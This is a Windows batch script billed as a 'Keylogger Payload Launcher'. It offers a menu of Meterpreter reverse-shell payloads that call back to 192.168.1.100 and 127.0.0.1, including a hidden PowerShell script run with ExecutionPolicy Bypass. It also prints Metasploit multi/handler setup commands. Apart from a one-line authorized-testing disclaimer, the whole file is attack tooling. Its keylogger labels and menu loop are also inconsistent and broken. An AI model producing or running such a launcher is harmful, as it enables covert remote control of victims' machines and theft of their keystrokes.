@echo off
title Keylogger Payload Launcher
color 0A

echo =======================================
echo    KEYLOGGER PAYLOAD LAUNCHER
echo =======================================
echo.
echo WARNING: For authorized testing only!
echo Only use on systems you own or have permission to test.
echo.
echo Available Payloads:
echo.
echo 1. Windows x64 TCP Reverse Shell (Port 4444)
echo    - Standard Meterpreter payload
echo    - Connects to 192.168.1.100:4444
echo.
echo 2. Windows HTTPS Reverse Shell (Port 443) 
echo    - Encrypted HTTPS communication
echo    - Connects to 192.168.1.100:443
echo.
echo 3. PowerShell In-Memory (Port 8080)
echo    - Fileless execution
echo    - Connects to 127.0.0.1:8080
echo.
echo 4. Python Cross-Platform (Port 4445)
echo    - Works on Windows/Linux/Mac
echo    - Connects to 192.168.1.100:4445
echo.
echo 5. Show Handler Setup Instructions
echo.
echo 6. Exit
echo.

set /p choice="Select payload (1-6): "

if "%choice%"=="1" (
    echo.
    echo Launching Windows x64 TCP payload...
    echo Make sure handler is listening on 192.168.1.100:4444
    timeout /t 3 >nul
    start windows_keylogger_test.exe
    goto end
)

if "%choice%"=="2" (
    echo.
    echo Launching Windows HTTPS payload...
    echo Make sure HTTPS handler is listening on 192.168.1.100:443
    timeout /t 3 >nul
    start windows_https_keylogger.exe
    goto end
)

if "%choice%"=="3" (
    echo.
    echo Launching PowerShell payload...
    echo Make sure handler is listening on 127.0.0.1:8080
    timeout /t 3 >nul
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File powershell_keylogger.ps1
    goto end
)

if "%choice%"=="4" (
    echo.
    echo Launching Python payload...
    echo Make sure handler is listening on 192.168.1.100:4445
    timeout /t 3 >nul
    python python_keylogger_test.py
    if errorlevel 1 (
        echo Python not found, trying py command...
        py python_keylogger_test.py
    )
    goto end
)

if "%choice%"=="5" (
    echo.
    echo HANDLER SETUP INSTRUCTIONS:
    echo ============================
    echo.
    echo 1. On your Kali machine, run:
    echo    msfconsole -r handler_setup.rc
    echo.
    echo 2. Or manually set up handlers:
    echo    msfconsole
    echo    use exploit/multi/handler
    echo    set payload [payload_type]
    echo    set LHOST [your_ip]
    echo    set LPORT [port]
    echo    exploit -j
    echo.
    echo 3. Available handler combinations:
    echo    - windows/x64/meterpreter/reverse_tcp (Port 4444)
    echo    - windows/meterpreter/reverse_https (Port 443)
    echo    - windows/x64/meterpreter/reverse_tcp (Port 8080)
    echo    - python/meterpreter/reverse_tcp (Port 4445)
    echo.
    pause
    goto start
)

if "%choice%"=="6" (
    goto end
)

echo.
echo Invalid selection. Please choose 1-6.
timeout /t 2 >nul
goto start

:start
cls
goto :eof

:end
echo.
echo Payload executed. Check your Metasploit console for connections.
echo Remember to clean up after testing!
echo.
pause